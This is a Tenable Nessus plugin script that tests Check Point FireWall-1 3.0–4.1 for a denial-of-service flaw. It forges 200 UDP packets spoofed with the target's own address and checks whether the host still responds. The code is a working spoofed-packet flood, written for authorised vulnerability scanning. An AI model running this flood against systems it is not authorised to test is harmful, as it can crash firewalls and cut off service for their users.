#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11905);
 script_version ("$Revision: 1.9 $");
 script_bugtraq_id(1419);
 script_xref(name:"OSVDB", value:"55094");

 script_name(english:"Check Point FireWall-1 Spoofed UDP Packet Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote firewall is affected by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The machine (or a router on the way) crashed when it was flooded by 
incorrect UDP packets.
This attack was known to work against FireWall-1 3.0, 4.0 or 4.1

An attacker may use this flaw to shut down this server, thus 
preventing you from working properly." );
 script_set_attribute(attribute:"solution", value:
"If this is a FW-1, enable the antispoofing rule;
Otherwise, contact your software vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Flood the target with incorrect UDP packets");
 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#

include("global_settings.inc");

if ( TARGET_IS_IPV6 ) exit(0);
if ( report_paranoia < 2 ) exit(0); #FP

id = rand() % 65535 + 1;
sp = rand() % 65535 + 1;
dp = rand() % 65535 + 1;

start_denial();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                     ip_p:IPPROTO_UDP, ip_id: id, ip_ttl:0x40,
	     	        ip_src: get_host_ip());
udp = forge_udp_packet(ip:ip, uh_sport: sp, uh_dport: dp, uh_ulen: 8+1, data: "X");

send_packet(udp, pcap_active: 0) x 200;

alive = end_denial();
if(!alive)
{
	security_warning();
	set_kb_item(name:"Host/dead", value:TRUE);
}

